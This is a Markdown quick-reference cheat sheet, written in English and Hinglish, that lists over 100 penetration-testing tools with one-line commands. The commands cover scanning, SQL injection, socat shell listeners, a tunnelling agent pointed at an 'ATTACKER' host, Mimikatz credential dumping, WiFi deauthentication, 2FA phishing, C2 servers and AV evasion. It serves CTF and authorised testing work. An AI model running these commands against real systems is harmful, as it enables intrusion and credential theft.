# ⚔️ Tools Arsenal — 100+ Hacking Tools Reference

> Quick command reference. Jab bhi koi tool ka syntax bhool jaye, yahan dekh.

---

## 🔍 Reconnaissance & Scanning

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Nmap** | Port scanning | `nmap -sV -sC -p- -T4 TARGET` |
| **Masscan** | Ultra-fast scanning | `masscan -p1-65535 TARGET --rate=1000` |
| **Rustscan** | Fast port scanner | `rustscan -a TARGET -- -sV -sC` |
| **Netdiscover** | ARP network scan | `netdiscover -r 192.168.1.0/24` |
| **Subfinder** | Subdomain enum | `subfinder -d target.com -o subs.txt` |
| **Amass** | Advanced subdomain | `amass enum -d target.com` |
| **httpx** | Probe live hosts | `cat subs.txt \| httpx -sc -title` |
| **Nuclei** | Vuln scanner | `nuclei -u https://target.com -severity critical,high` |
| **Nikto** | Web vuln scanner | `nikto -h http://target.com` |
| **WhatWeb** | Tech detection | `whatweb http://target.com` |
| **Shodan CLI** | IoT search | `shodan search "apache 2.4"` |
| **theHarvester** | Email/subdomain | `theHarvester -d target.com -b all` |
| **Sherlock** | Username OSINT | `sherlock username` |
| **Maigret** | Better username OSINT | `maigret username --all-sites` |
| **Holehe** | Email registration check | `holehe target@email.com` |
| **Recon-ng** | OSINT framework | `recon-ng` |
| **Maltego** | Visual OSINT | `maltego` (GUI) |
| **EyeWitness** | Screenshot websites | `eyewitness --web -f urls.txt` |

---

## 🕸️ Web Application Testing

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Gobuster** | Dir brute force | `gobuster dir -u URL -w wordlist -t 50` |
| **ffuf** | Fast fuzzer | `ffuf -u URL/FUZZ -w wordlist -mc 200,301,302` |
| **Feroxbuster** | Recursive dir scan | `feroxbuster -u URL -w wordlist --depth 3` |
| **Dirb** | Dir scanner | `dirb http://target wordlist` |
| **Burp Suite** | Web proxy | GUI tool — intercept, modify, replay requests |
| **SQLMap** | SQL injection | `sqlmap -r request.txt --batch --dbs` |
| **XSStrike** | XSS scanner | `xsstrike -u "URL?param=test"` |
| **Dalfox** | XSS scanner | `dalfox url "URL?param=test"` |
| **WPScan** | WordPress scanner | `wpscan --url URL --enumerate u,vp,vt` |
| **CMSmap** | CMS scanner | `cmsmap http://target` |
| **Commix** | Command injection | `commix -u "URL?param=test"` |
| **JWT_Tool** | JWT testing | `jwt_tool TOKEN` |
| **Arjun** | Hidden parameters | `arjun -u URL` |
| **ParamSpider** | Parameter discovery | `paramspider -d target.com` |

---

## 💣 Exploitation

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Metasploit** | Exploit framework | `msfconsole -q` |
| **msfvenom** | Payload generator | `msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o file` |
| **SearchSploit** | Exploit search | `searchsploit service version` |
| **Netcat** | Swiss army knife | `nc -lvnp 4444` (listener) |
| **Socat** | Advanced netcat | `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash` |
| **pwncat** | Smart reverse shell | `pwncat-cs -lp 4444` |
| **Impacket** | Windows tools | `impacket-psexec user@TARGET` |
| **Evil-WinRM** | WinRM shell | `evil-winrm -i TARGET -u user -p pass` |
| **CrackMapExec** | Network pentesting | `crackmapexec smb TARGET -u user -p pass` |
| **Chisel** | Pivoting/tunneling | `chisel server -p 8000 --reverse` |
| **Ligolo-ng** | Modern tunneling | `ligolo-agent -connect ATTACKER:11601` |

---

## 🔑 Password Attacks

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Hydra** | Online brute force | `hydra -l admin -P wordlist ssh://TARGET` |
| **John** | Offline hash cracking | `john --wordlist=rockyou.txt hashes.txt` |
| **Hashcat** | GPU hash cracking | `hashcat -m 0 hashes.txt rockyou.txt` |
| **CeWL** | Wordlist from website | `cewl URL -d 3 -m 5 -w wordlist.txt` |
| **Crunch** | Custom wordlist gen | `crunch 8 8 -t @@@@%%%% -o wordlist.txt` |
| **Responder** | NTLM hash capture | `responder -I eth0 -dwPv` |
| **Mimikatz** | Windows cred dump | `sekurlsa::logonPasswords` |
| **LaZagne** | Password recovery | `lazagne.exe all` |

---

## 🌐 Network Attacks

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Bettercap** | MITM framework | `bettercap -iface eth0` |
| **Ettercap** | MITM/ARP spoof | `ettercap -T -q -M arp:remote /VIC// /GW//` |
| **arpspoof** | ARP spoofing | `arpspoof -i eth0 -t VICTIM GATEWAY` |
| **Wireshark** | Packet analyzer | `wireshark` (GUI) |
| **tcpdump** | CLI packet capture | `tcpdump -i eth0 -w capture.pcap` |
| **Scapy** | Packet crafting | Python: `from scapy.all import *` |
| **DNSChef** | DNS spoofing | `dnschef --fakedomains target.com --fakeip IP` |
| **mitmproxy** | HTTP/HTTPS MITM | `mitmproxy --mode transparent` |

---

## 📡 Wireless

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **airmon-ng** | Monitor mode | `airmon-ng start wlan0` |
| **airodump-ng** | WiFi scanner | `airodump-ng wlan0mon` |
| **aireplay-ng** | Deauth attack | `aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| **aircrack-ng** | WPA cracker | `aircrack-ng capture.cap -w rockyou.txt` |
| **Wifite** | Auto WiFi audit | `wifite --kill` |
| **Airgeddon** | Menu WiFi attacks | `bash airgeddon.sh` |
| **Wifiphisher** | Evil twin attack | `wifiphisher` |
| **Fluxion** | Evil twin | `./fluxion.sh` |
| **hcxdumptool** | PMKID capture | `hcxdumptool -i wlan0mon -o pmkid.pcapng` |

---

## ⬆️ Privilege Escalation

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **LinPEAS** | Linux enum | `./linpeas.sh` |
| **WinPEAS** | Windows enum | `.\winPEASx64.exe` |
| **LinEnum** | Linux enum | `./LinEnum.sh` |
| **LSE** | Smart Linux enum | `./lse.sh -l 2` |
| **pspy** | Process monitoring | `./pspy64` |
| **PowerUp** | Windows priv esc | `Invoke-AllChecks` |
| **PrintSpoofer** | Token impersonation | `PrintSpoofer.exe -i -c cmd` |
| **GodPotato** | Token impersonation | `GodPotato.exe -cmd "cmd /c whoami"` |
| **GTFOBins** | SUID/sudo exploits | https://gtfobins.github.io/ |
| **LOLBAS** | Windows LOL binaries | https://lolbas-project.github.io/ |

---

## 🎭 Social Engineering

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **SET** | SE Toolkit | `setoolkit` |
| **Gophish** | Phishing framework | `./gophish` |
| **Zphisher** | Auto phishing | `bash zphisher.sh` |
| **Evilginx** | 2FA phishing | `./evilginx` |
| **King Phisher** | Phishing campaign | GUI tool |
| **BeEF** | Browser exploit | `beef-xss` |

---

## 🔬 Post-Exploitation & C2

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **Sliver** | Modern C2 | `sliver-server` |
| **Mythic** | C2 with Web UI | `./mythic-cli start` |
| **Havoc** | Modern C2 | `./havoc server` |
| **Cobalt Strike** | Commercial C2 | (Licensed — $3,500/year) |
| **Empire** | PowerShell C2 | `./empire` |
| **Veil** | AV evasion | `veil` |
| **Shellter** | PE infector | `shellter` |

---

## 🔧 Utility Tools

| Tool | Purpose | Quick Command |
|------|---------|---------------|
| **curl** | HTTP requests | `curl -X POST URL -d "data"` |
| **wget** | Download files | `wget URL -O file` |
| **Python HTTP** | Quick web server | `python3 -m http.server 8000` |
| **SCP** | Secure file copy | `scp file user@target:/path/` |
| **SSH tunnel** | Port forwarding | `ssh -L 8080:internal:80 user@target` |
| **Proxychains** | Proxy traffic | `proxychains nmap TARGET` |
| **tmux** | Terminal multiplexer | `tmux` (sessions, windows, panes) |
| **CyberChef** | Encoding/decoding | https://gchq.github.io/CyberChef/ |
| **RevShells** | Reverse shell gen | https://www.revshells.com/ |
| **Ghidra** | Reverse engineering | `ghidra` |
| **Cutter** | RE (radare2 GUI) | `cutter` |

---

## 📚 Wordlists Location

```bash
# Kali default
/usr/share/wordlists/rockyou.txt        # 14M passwords
/usr/share/wordlists/dirb/common.txt    # Directory wordlist
/usr/share/wordlists/dirbuster/         # Directory lists

# SecLists (install: sudo apt install seclists)
/usr/share/seclists/Passwords/          # Password lists
/usr/share/seclists/Usernames/          # Username lists
/usr/share/seclists/Discovery/Web-Content/  # Web directories
/usr/share/seclists/Discovery/DNS/      # DNS wordlists
/usr/share/seclists/Fuzzing/            # Fuzzing payloads
/usr/share/seclists/Payloads/           # Attack payloads
```

---

> **Bookmark this file! Use it as quick reference during CTFs and engagements.** 🔖
